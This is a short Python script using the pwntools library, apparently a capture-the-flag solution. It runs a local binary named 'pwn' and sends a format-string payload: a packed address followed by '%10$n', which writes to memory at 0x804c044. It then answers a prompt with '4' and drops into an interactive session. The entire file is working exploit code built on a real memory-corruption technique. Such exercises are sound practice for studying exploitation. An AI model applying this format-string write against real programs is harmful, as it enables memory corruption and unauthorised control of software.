from pwn import *

context.log_level = 'DEBUG'

p = process('./pwn')

p.sendlineafter(':', p32(0x804c044) + '%10$n')
p.sendlineafter(':', '4')

p.interactive()